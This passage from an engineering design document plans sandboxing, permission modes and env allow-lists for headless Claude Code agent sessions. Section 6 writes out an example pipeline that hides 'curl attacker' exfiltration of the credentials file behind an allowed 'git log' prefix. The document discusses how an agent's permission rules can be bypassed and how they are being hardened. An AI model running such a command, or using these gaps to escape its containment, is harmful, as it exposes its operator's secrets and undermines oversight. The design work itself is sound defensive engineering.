**Fallback if S7 fails** (i.e. `dontAsk` on 2.1.215 unexpectedly still renders some
prompt): use `--permission-prompt-tool` (spike S2) to route that residual prompt to an
MCP tool that programmatically DENIES out-of-scope actions and returns — replacing a
blind "press 1/yes" with a policy-evaluating denier. This keeps fail-closed semantics
without a rendered TUI prompt. This is the backup, not the plan; `dontAsk` is the plan.

## 6. OS-level sandboxing — straight answer

**Question: is OS-level sandboxing (separate uid / container / sandbox profile) required
for Bash rituals regardless of what Claude Code offers?**

**Answer: YES, OS-level confinement is required for any caller that holds Bash — but as
of CC 2.1.215 you very likely do NOT need to build it yourself, because Claude Code now
ships native OS sandboxing (§2.4). Use the built-in sandbox; fall back to a separate
uid/container only if the spike (S6) shows the native sandbox is insufficient.**

Reasoning, not hand-waving:

1. **Permission rules cannot contain a shell child.** `permissions.allow`/`deny` and
   PreToolUse hooks govern whether the `Bash` TOOL runs and can inspect its command
   string, but once a shell process starts, anything it does — redirects, spawned
   subprocesses, reading `/proc/self/environ`, writing outside cwd — is not a further
   sequence of Claude tool calls. `Bash(git log *)` allowed as a prefix does not stop
   `git log && env > /tmp/x && curl attacker $(cat ~/.claude/.credentials.json)` from
   executing within one approved invocation, because the prefix rule matches the leading
   token, not the whole pipeline. The prior in-repo proof
   (`docs/plans/executor-mode-reminders-2026-07-20.md`: "With Bash granted, containment
   is OS-level or nothing") stands. So containment for Bash MUST be at the OS boundary.

2. **CC's native sandbox IS that OS boundary** (§2.4): macOS Seatbelt / Linux bubblewrap,
   enforcing filesystem write confinement, credential-file deny/mask, and network
   allow-list on the shell child and ITS descendants (child processes inherit). This is
   exactly the layer permission rules lack. On the platforms Neutron targets (this host
   is macOS/darwin; production may be Linux) it is available.

3. **What the native sandbox gives us for a Bash ritual:**
   `sandbox.filesystem.allowWrite: [<scope>, temp]` (deny all other writes),
   `sandbox.credentials.files[].mode: deny` for `~/.claude/.credentials.json` / `~/.ssh`
   / `.env`, `sandbox.network` domain allow-list (empty = no egress). Combined with the
   §8 env allow-list (so the secrets aren't even in the child's env), a Bash ritual's
   blast radius drops to: its scope dir, its allowed domains, and nothing else.

4. **When a separate uid / container is STILL warranted (spike S6 decides):**
   - if the native sandbox's network proxy prompts on first domain (docs say it does)
     and there's no headless-clean way to pre-seed the allow-list → a stricter jail may
     be needed for no-egress rituals;
   - if bubblewrap/Seatbelt is unavailable in the production deploy (containerized host
     without the needed syscalls / entitlements);
   - if defense-in-depth against a Claude-Code-sandbox escape is judged necessary for the
     highest-risk rituals (dreaming/kaizen running unattended at 3am with Bash).
   In those cases: run the Bash-ritual REPL under a dedicated low-privilege uid with no
   access to the gateway's secrets and its own throwaway HOME, ideally inside a container.
   This is heavier and is a later sprint; the native sandbox is the first move.

**Bottom line by caller:**
- **Caller 3b (Bash rituals): native sandbox REQUIRED before any Bash ritual ships.**
  Not optional, not deferrable. A Bash ritual with only permission rules is uncontained.
- **Caller 1 (Bash-in-chat): native sandbox REQUIRED wherever Bash is granted**, same
  reasoning — untrusted input + Bash is the worst pairing.
- **Callers 2 & 3a (no Bash): native sandbox recommended as defense-in-depth** (enable
  the credential-file deny) but the no-Bash read-only surface is the primary containment.
- **Separate uid/container: conditionally required (S6)** — default to CC's native
  sandbox; escalate to a real jail only where S6 proves the native sandbox insufficient
  or unavailable.

## 7. Shared `~/.claude.json` trust writes

**Current (verified §1.5):** `ensureClaudeTrust` writes into the owner's global
`~/.claude.json` on every spawn — `bypassPermissionsModeAccepted: true`,
`hasCompletedOnboarding: true`, and per-cwd `hasTrustDialogAccepted: true`. The
function already takes a `configDir` override (`ensure-claude-trust.ts:65-68`) but no
production caller passes one.

**Is it acceptable? No — two distinct problems.**

1. **Global-state mutation blast.** Setting `bypassPermissionsModeAccepted: true` in
   the owner's real `~/.claude.json` changes how the owner's OWN interactive `claude`
   sessions behave, not just Neutron's spawned children. A user who has never opted
   their personal CLI into bypass mode gets opted in as a side effect of Neutron
   running. That is a surprising, security-relevant change to a config file Neutron
   does not own.

2. **It is load-bearing for the wrong thing.** Today it exists to suppress the trust
   dialog + bypass-acceptance prompt so the headless REPL doesn't wedge. Under the new
   design (§4), if a caller no longer runs under `--dangerously-skip-permissions`, the
   `bypassPermissionsModeAccepted` write becomes unnecessary for that caller — the
   flag only matters when entering bypass mode.

**Can it be scoped? Yes — `CLAUDE_CONFIG_DIR`.** Claude Code reads its config from
`$CLAUDE_CONFIG_DIR` when set (to be confirmed against 2.1.215 docs in §2, item 6).
The fix:

- Give each managed spawn a Neutron-owned config dir (e.g.
  `<instance-home>/.neutron-claude/`) via `CLAUDE_CONFIG_DIR` in the child env, and
  pass that path as `ensureClaudeTrust({ configDir })`. The trust/onboarding writes
  then land in a Neutron-private file, never the owner's `~/.claude.json`.
- This ALSO scopes the per-cwd trust entries — they no longer accumulate in the
  owner's global projects map.
- **Spike required (S4):** confirm 2.1.215 honors `CLAUDE_CONFIG_DIR` for BOTH the
  onboarding/trust gate AND the `--settings`/permissions resolution, and that a
  child with an isolated config dir still finds the pool credential + MCP config
  (those are passed explicitly by flag/env, so they should be unaffected — verify).

**Recommendation:** scope via `CLAUDE_CONFIG_DIR` per instance home. Stop writing the
owner's global config unconditionally. For any caller that still needs bypass mode
(see §4/§5), write `bypassPermissionsModeAccepted` ONLY into the Neutron-private
config dir. This is a strict containment win and is independent of the harder
permission-model decisions — it can ship early (§9).

## 8. Credential blast radius — env allow-list

**Current (verified §1.6):** `mergeEnv` (`repl-session.ts:410-426`) hands the child
`{ ...process.env }` minus exactly three Anthropic auth vars, plus the selected pool
credential. Everything else the gateway holds in its environment is inherited: any
`*_API_KEY`, `*_TOKEN`, `OP_SERVICE_ACCOUNT_TOKEN`, SerpAPI/Apify/Gemini/Netlify/IONOS
keys, database URLs, webhook secrets — whatever the gateway process was started with.

**Why this matters per caller.** For a child holding only `--tools ""` or a read-only
built-in surface, the env is reachable only if the child can run Bash or read
`/proc/self/environ`-style paths — which `--tools ""` blocks for built-ins. But the
moment any caller holds **Bash** (caller 3 rituals, per Ryan's decision), a one-line
`env` dumps every inherited secret, and a network-capable tool exfiltrates it. The
deny-only, blacklist-shaped current design cannot contain that; the env itself is the
leak.

**Recommendation: flip from deny-list to allow-list for children that hold Bash or
process untrusted input.** The three-key delete is a blacklist and has the same
unboundedness problem as a permission deny-list — it enumerates what to remove and
inherits everything else. Instead:

- Define a per-caller **env allow-list**: start from an empty/minimal base
  (`PATH`, `HOME`, `LANG`, `TMPDIR`, and the ONE selected pool credential + the
  MCP/channel wiring vars the substrate actually needs) and add nothing else. The
  child cannot leak a secret it never received.
- Callers 2 and 3 (no human, and caller 3 may hold Bash) get the **strict allow-list**.
  Caller 1 (warm chat) also benefits but needs whatever env its legitimate project
  tooling requires — enumerate that per project rather than inheriting the gateway's
  full secret set.
- **This is orthogonal to and complements OS sandboxing (§6):** even a sandboxed uid
  benefits from not being handed the gateway's secrets in the first place. Do both;
  the env allow-list is cheap and ships without OS work.

**Concrete change:** replace `mergeEnv`'s "start from process.env, delete three" with
a builder that starts from `{}` and copies only an explicit key list supplied per
substrate factory. Keep a `mergeEnv`-compatible signature for the warm-chat caller if
its project tooling genuinely needs broad env, but make the DEFAULT (ephemeral +
ritual) the allow-list path. **Spike S5:** enumerate the minimal env a
`cc-scribe-*`/`cc-ritual-*` REPL needs to boot and reach the pool credential + MCP
bridge; confirm it runs with nothing else.

## 9. Phased build order + required spikes

**Rule: nothing is trusted until the spike that proves it passes.** The spikes are
throwaway REPLs asserting a specific behavior on 2.1.215; they gate the phases.

### Spikes (do these FIRST, before any production change)

- **S7 (pivotal) — `dontAsk` renders NO prompt for key-to-kingdom paths.** Spawn a REPL
  under `--permission-mode dontAsk` with a minimal allow-list; have the agent attempt
  (a) a write to `.git/hooks/pre-commit`, (b) a write outside the project root, (c) a
  `Bash` command not in allow, (d) `Read(~/.claude/.credentials.json)`. Assert each is
  DENIED, NO permission-prompt text ever enters the ring, and the turn COMPLETES (no
  hang). **This is the gate for the entire migration** — if it fails, §5's fallback
  (`--permission-prompt-tool`) becomes load-bearing.
- **S3 — do `permissions.deny` rules apply under `bypassPermissions`?** Determines
  whether any residual bypass caller can still be fenced. (Docs silent.)
- **S1 — `--tools` vs `--allowedTools` for built-in gating.** Repo says `--tools` gates
  built-ins and `--allowed-tools` does not (§1.1); docs describe `--allowedTools` as the
  allow-list. Resolve which flag actually restricts the built-in surface on 2.1.215 so
  §4's surfaces are correct.
- **S6 — native sandbox sufficiency for a Bash ritual.** On the target OS (macOS
  Seatbelt now; Linux bubblewrap for prod), configure `sandbox.filesystem` +
  `sandbox.credentials` + `sandbox.network` and assert a Bash child CANNOT (a) write
  outside scope, (b) read a denied credential file, (c) reach a non-allowed domain, (d)
  the headless network-prompt-on-first-domain behavior is handled without a hang. Decides
  whether a separate uid/container is additionally needed.
- **S4 — `CLAUDE_CONFIG_DIR` isolates the config file** (trust/onboarding writes land in
  a Neutron-private dir, and the child still boots + finds pool creds + MCP config).
- **S5 — minimal env allow-list** for `cc-scribe-*`/`cc-ritual-*` (enumerate the smallest
  env that still boots and reaches the pool credential + MCP bridge).
- **S2 — `--permission-prompt-tool` contract** (only needed if S7 fails).

### Phase A — config-scoping wins (independent, ship early)

No dependency on the permission-model decision; pure containment improvements.
- Scope config writes via `CLAUDE_CONFIG_DIR` per instance home (§7), gated on **S4**.
- Env allow-list for ephemeral + ritual callers (§8), gated on **S5**.
- Close the MCP per-tool manifest gap at dispatch (§1.7) so a namespace grant can't be
  abused. (No spike; a straightforward check against the session's tool manifest before
  `bridge.dispatch`.)

### Phase B — `dontAsk` migration for the no-human callers (2 & 3a)

Depends on **S7** (and S1 for correct surfaces).
- Flip `cc-llm-*`, `cc-scribe-*`, `cc-reflect-*` and read-only/scope-write rituals to
  `--permission-mode dontAsk` with read-only (or scope-write) `--tools` + `permissions`.
- Write the per-session `permissions` block (extend `BuildSettingsInput` +
  `buildSettings`, §1.3).
- Gate the `tool-use-approve` scanner registration on permission mode (§5 step 3) — do
  NOT register it for `dontAsk` sessions.
- Read-only rituals (morning-brief, evening-wrap, book-refresh, daily-delta) ship here —
  they need no Bash and no sandbox beyond defense-in-depth.

### Phase C — warm CHAT repl (caller 1) to `dontAsk`

Depends on Phase B proving the mechanism on lower-risk callers.
- Flip `cc-agent-*` to `dontAsk` with the project-work surface + `permissions` allow/deny
  + PreToolUse deny hook for the credential/out-of-root patterns (§4.1).
- Where the project workflow needs Bash, pair with Phase D sandboxing before enabling it.

### Phase D — native OS sandbox for Bash callers

Depends on **S6**. Gates EVERY Bash-holding caller (1-with-Bash, 3b).
- Enable `sandbox.*` (filesystem scope, credential deny/mask, network allow-list) for
  any REPL granted Bash.
- No Bash ritual (kaizen, dreaming) ships until this phase is verified.
- If S6 shows the native sandbox insufficient/unavailable in prod → escalate that
  specific caller to a dedicated low-priv uid/container (separate later sprint).

### Phase E — remove the auto-approver

Depends on all callers being off bypass (Phases B+C complete).
- Delete the `tool-use-approve` scanner + `TOOL_USE_QUESTION_RE`/`TOOL_USE_SELECTOR_RE`
  (§5 step 4). Keep the rate-limit and wedge-recovery scanners.

### Sequencing summary

Spikes → A (parallel, independent) → B → C → D (D can overlap C for the Bash-in-chat
path) → E (last, after nothing renders prompts). The read-only rituals the executor-mode
plan wants can ship at the end of Phase B; Bash rituals wait for Phase D.

## 10. What we deliberately do NOT change

- **`--tools` default-deny stays exactly as-is.** It is the one layer that genuinely
  holds today (§1.1), verified to survive skip-permissions, and it remains load-bearing
  under `dontAsk` as the built-in surface gate. We ADD to it, we do not replace it.
- **The rate-limit auto-stop and P0 wedge-recovery scanners stay** (`spawn.ts:247+`).
  They are unrelated to permissions; only `tool-use-approve` is coupled to the model.
- **The Stop / enforce-reply hook stays.** The reply-invariant the bridge depends on is
  orthogonal to permissions; the new `permissions` block is ADDED to the same settings
  JSON, not swapped for the hook.
- **The credential POOL and its three-key scrub semantics stay** for the warm chat caller
  where broad project env may be legitimately needed. The env allow-list (§8) becomes the
  DEFAULT for no-human/Bash callers, but the existing `mergeEnv` delete-contract is not
  ripped out from under caller 1 without enumerating that project's env needs.
- **We do NOT move to the Agent SDK / `canUseTool`.** It's CLI-vs-SDK; Neutron is built
  on the CLI substrate and `dontAsk` + hooks give us fail-closed containment without a
  substrate rewrite. `canUseTool` is noted for completeness only.
- **We do NOT adopt `bypassPermissions` for any new caller.** The whole point is to leave
  bypass behind. Any residual bypass caller (if a migration is staged) keeps its gated
  auto-approver until it too moves to `dontAsk`.
- **We do NOT hand-build a uid/container jail up front.** CC's native sandbox is the
  first move; a separate jail is a conditional, spike-gated escalation (§6, S6), not a
  default.
- **The MCP namespace grant model stays**, but we ADD a per-tool manifest check at
  dispatch (§1.7). We don't redesign the bridge; we close the one gap.
- **Approval mechanism for rituals is NOT designed here.** It belongs to
  `docs/plans/executor-mode-reminders-2026-07-20.md` (content-hash binding, no
  self-approval, `tool_approvals` rows). This doc designs the CONTAINMENT that the
  approval authorizes, and defers to that plan for the gate itself.

---

## Appendix: open verification ledger

| Spike | Claim to prove | Blocks |
|---|---|---|
| S7 | `dontAsk` renders no prompt for `.git/hooks/*`, out-of-root writes, denied Bash, cred reads; agent continues | Phases B, C, E (the whole migration) |
| S6 | Native sandbox confines Bash child (fs/cred/network); headless network-prompt handled | Phase D, all Bash callers |
| S3 | Whether `permissions.deny` applies under `bypassPermissions` | residual-bypass fencing |
| S1 | Which flag (`--tools` vs `--allowedTools`) gates the built-in surface on 2.1.215 | correct surfaces in §4 |
| S4 | `CLAUDE_CONFIG_DIR` isolates config writes; child still boots | Phase A (§7) |
| S5 | Minimal env allow-list boots + reaches pool cred + MCP | Phase A (§8) |
| S2 | `--permission-prompt-tool` input/output contract | §5 fallback only |

**Nothing in Phases B-E is trusted until S7 passes.** S7 is the linchpin: it is the
single experiment that proves the entire "move off skip-permissions to `dontAsk`" thesis
on the pinned version. Run it first.
